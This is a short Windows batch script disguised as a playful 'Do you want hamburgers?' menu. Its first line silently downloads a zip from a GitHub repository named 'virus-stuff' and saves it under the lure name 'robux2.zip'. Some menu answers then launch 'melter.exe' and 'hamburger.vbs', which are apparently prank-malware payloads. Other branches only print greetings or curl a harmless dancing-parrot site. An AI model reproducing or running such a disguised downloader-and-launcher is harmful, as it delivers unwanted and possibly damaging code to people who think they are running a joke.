

powershell -command "Invoke-WebRequest https://github.com/astrohnugget/virus-stuff/archive/refs/heads/main.zip -outfile robux2.zip"
cls

color a 
cls

@ECHO OFF

:choice
set /P c=Do you want hamburgers?[Y/N]?
if /I "%c%" EQU "Y" goto :start
if /I "%c%" EQU "N" goto :no start
if /I "%c%" EQU "hi" goto :hello
if /I "%c%" EQU "dance" goto :parrot
if /I "%c%" EQU "hamburger" goto :hamburger
timeout /t 3 /nobreak
goto :choice


:start

start melter.exe

:no start

echo "ok, goodbye!"
pause
exit

:hamburger

echo "HAMBURGER!!!!!!!, in t-minus 10 SECONDS!!!!"
timeout /t 10

start hamburger.vbs
echo "lol"
pause
exit


:hello 

echo "hello!"
pause
exit

:parrot

curl parrot.live

pause
exit
